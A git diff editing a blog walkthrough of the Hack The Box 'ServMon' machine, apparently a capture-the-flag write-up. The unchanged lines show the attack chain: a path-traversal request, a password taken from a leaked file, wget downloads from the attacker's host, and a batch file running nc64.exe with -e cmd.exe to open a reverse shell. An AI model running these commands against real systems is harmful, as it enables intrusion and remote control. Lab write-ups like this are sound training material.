@@ -176,7 +176,7 @@ To me, there are three interesting ports: ftp on 21, http on 80, and https on 84
 
 ![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_20-50-00.png)
 
-For anonymous login, really all we have to do is put in "anonymous" as the user name and hit enter when prompted for a password. FTP commands are quite similar to the linux command line with some slight differences. However, I encourage you to get familiar with the FTP command line before we go forward: https://www.cs.colostate.edu/helpdocs/ftp.html
+For anonymous login, really all we have to do is put in "anonymous" as the user name and hit enter when prompted for a password. FTP commands are quite similar to basic unix/unix-like commands with some slight differences. However, I encourage you to get familiar with the FTP command line before we go forward: https://www.cs.colostate.edu/helpdocs/ftp.html
 
 here we find the User folder and two Subfolders: Nathan and Nadine both seem to contain text files, I'm going to transfer those locally using the **get** command:
 
@@ -204,9 +204,9 @@ on port 8443, we have service called NSClient++ (recommend you open this in a ch
 
 ![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_22-31-22.png)
 
-I tried to input some default user/password combo to see if those worked, but no luck on those. Let's see if there are any CVEs associated with either applications.
+I tried to input some default user/password combos (i.e. admin/admin, admin/password, user/password, etc.) to see if those worked, but no luck on those. Let's see if there are any CVEs associated with either applications.
 
-Looks like exploit-db has two exploit for each app:
+Looks like exploit-db has two exploits: one for each app:
 
 NVMS-1000: https://www.exploit-db.com/exploits/48311
 
@@ -230,11 +230,17 @@ replace the GET request line with "GET ../../../../../../../../../../../../../us
 
 ![](/assets/img/htb_servmon/Screenshot_From_2024-09-27_23-30-48.png)
 
-looks like we have the passwords file! for later reference, you should copy it into a txt file if you want. Now let's see if we can get an ssh session using either nathan or nadine. 
+looks like we have the passwords file! Ior later reference, I recommend that you copy it into a txt file on your machine. Now let's see if we can get an ssh session using either nathan or nadine. 
 
-this was largely trial-and-error, but the user/password combo that I landed on was nadine and L1k3B1gBut7s@W0rk (Nadine may need to have a talk with HR), and now we are in! It looks like we were prompted with a windows prompt for nadine at C:\\Users\\Nadine. If you poke around, you can find the user.txt flag at C:\\Users\\Nadine\\Desktop.
+Since there were only a few possible combinations, I just did manual trial/error to figure this out. However, you can automate this with a tool like crackmapexec. The user/password combo that I landed on was nadine and L1k3B1gBut7s@W0rk (Nadine may need to have a talk with HR), and now we are in! It looks like we are greeted with a windows prompt for nadine at C:\\Users\\Nadine. If you poke around, you can find the user.txt flag at C:\\Users\\Nadine\\Desktop.
 
-now let's see if we can get root using the NSClient++ exploit:
+**Note: We are going to be using windows cmd and powershell from here on out, so please be sure to get familiar with the commands for both:**
+
+**Windows CMD cheat sheet:** https://www.stationx.net/windows-command-line-cheat-sheet/
+
+**Powershell cheat sheet:** https://www.stationx.net/powershell-cheat-sheet/
+
+Now let's see if we can get root using the NSClient++ exploit:
 
 ### Weaponization round two (root flag)
 
@@ -254,7 +260,7 @@ I dug back through the docs and the ini to see if I was missing something and it
 allowed hosts = 127.0.0.1
 ```
 
-looks like it only allows for localhost to do the traffic.
+Looks like it only allows for localhost to do the traffic.
 
 we could edit the file, or we could try and make a tunnel via ssh and do some port forwarding so we can register as the localhost. 
 
@@ -292,7 +298,7 @@ or
 	@echo off
 	c:\\temp\\nc64.exe 192.168.0.163 443 -e cmd.exe
 
-**[COMPLETED]** easiest way I saw to do this was to set up a python web server and transfer the files through iwr on the target machine:
+**[COMPLETED]** easiest way I saw to do this was to set up a python web server and transfer the files through wget on the target machine:
 
 attacker machine (your machine):
 
@@ -307,6 +313,8 @@ powershell
 wget http://10.10.14.4:8080/nc64.exe -o nc64.exe
 wget http://10.10.14.4:8080/evil.bat -o evil.bat
 ```
+
+you can get nc64.exe here: https://github.com/int0x33/nc.exe/blob/master/nc64.exe
 
 **NOTE: make sure you use nc64.exe, nc.exe will get flagged by the OS as malicious and automatically deleted**
 
@@ -364,7 +372,7 @@ Run evil.bat and check your netcat instance:
 
 ![](/assets/img/htb_servmon/Screenshot_From_2024-10-01_00-20-26.png)
 
-you should be greeted by a prompt, and if you run whoami, you should see this:
+You should be greeted by a prompt, and if you run whoami, you should see this:
 
 ![](/assets/img/htb_servmon/Screenshot_From_2024-10-01_00-25-23.png)
 
@@ -372,6 +380,6 @@ Then if you navigate to the desktop for the administrator user, you should see t
 
 ![](/assets/img/htb_servmon/Screenshot_From_2024-10-01_00-29-22.png)
 
-from there, you should see the root.txt file containing the root flag
+From there, you should see the root.txt file containing the root flag
 
 Hope this helped, happy hacking!
